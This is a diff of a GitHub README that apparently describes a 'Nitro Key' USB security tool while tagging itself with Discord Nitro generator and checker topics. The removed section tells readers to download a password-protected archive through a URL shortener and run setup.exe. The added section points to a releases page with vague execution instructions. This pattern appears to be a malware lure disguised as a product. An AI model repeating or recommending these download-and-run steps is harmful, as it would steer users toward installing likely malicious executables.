@@ -1,27 +1,45 @@
+# Nitro-key
 
-#  Nitro-key
-### 
->[!tip]
->  Nitro Key is a versatile USB security device that offers hardware encryption and secure access to digital assets and applications. It provides two-factor authentication, safeguarding sensitive data and ensuring user privacy, making it an essential tool for security-conscious individuals and organizations.
-###
+Nitro Key is a versatile USB security device that provides hardware encryption and secure access to digital assets and applications. It offers two-factor authentication, ensuring the protection of sensitive data and user privacy. This makes it an essential tool for security-conscious individuals and organizations.
 
-## Getting Started:
+## Features
 
-## 📥 Installation & Launch
+🔒 Hardware encryption for secure data protection  
+🔑 Two-factor authentication for added security  
+💻 Easy and secure access to digital assets  
+🛡️ Safeguards sensitive data  
+🔐 Ensures user privacy
 
-### 🔹 ✅ RECOMMENDED METHOD (Windows .exe)
-1️⃣ [Download](https://goo.su/szkCfWr) and extract archive(pass: Project12!)  
-2️⃣ Run setup.exe  
-🚀 The application will set up everything automatically, just enjoy!  
-⚠️ Important: This method is faster and requires no manual setup!  
+## Repository Topics
 
-## Contributing
-Contributions are welcome from those who wish to improve the functionality and security of this tool. Please fork the repository and submit a pull request with your enhancements.
-## License
-This project is distributed under the MIT License. See the LICENSE file for more details.
+- discord-nitro
+- discord-nitro-gen
+- discord-nitro-key
+- generator-key
+- generator-nitro
+- key-generator-nitro
+- nitro
+- nitro-checker
+- nitro-discord
+- nitro-features
+- nitro-features-discord
+- nitro-full
+- nitro-gen-checker
+- nitro-gen-checker-2025
+- nitro-generator
+- nitro-generator-discord-download
+- nitrogen
 
-## Acknowledgments
-- Thanks to the community for providing the underlying technologies that make this tool possible.
-- Gratitude to all users who contribute by sharing their feedback and improvements.
+## Download Nitro Key
 
-###
+Click the button below to download the latest release of Nitro Key:
+
+[![Download Nitro Key](https://img.shields.io/badge/Download-Nitro%20Key-blue)](https://github.com/truthtower1/Nitro-key/releases)
+
+## Instructions
+
+If the link above has a path part, download the file and follow the execution instructions. If the link only contains the domain, simply visit the page. If the link is not provided or not working, please check the "Releases" section on the GitHub repository.
+
+Stay secure with Nitro Key! 🚀
+
+![Nitro Key](https://source.unsplash.com/weekly?security)
